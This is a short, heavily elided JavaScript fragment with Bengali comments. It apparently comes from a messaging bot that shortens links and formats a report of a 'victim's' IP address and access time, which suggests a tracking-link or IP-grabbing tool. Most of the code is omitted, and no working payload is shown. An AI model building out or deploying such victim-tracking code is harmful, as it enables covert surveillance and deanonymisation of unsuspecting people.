...
// লোকাল URI কনফিগ পড়ি (মেইন অ্যাপে URI আপডেট করলেও এখানে ব্যবহারের দরকার নেই, শুধু টোকেনের জন্য ডিবি ব্যবহার)
...
async function getUserProfile(senderId) {
    ...
    try {
        ...
        return res.data; // { first_name, last_name, name, id }
    } catch (err) {
...
async function shortenUrl(longUrl) {
    try {
        ...
        return longUrl; // ব্যর্থ হলে আসল লিংক পাঠান
    }
}

// ভিক্টিম ডেটা ফরম্যাট করে মেসেজ বানানো
function formatVictimData(victim) {
    let msg = '✅ **ভিক্টিমের তথ্য পাওয়া গেছে!**\n\n';
    msg += `⚓️ **আইপি:** ${victim.ip || 'N/A'} | **সময়:** ${new Date(victim.timestamp).toLocaleString()}\n\n`;
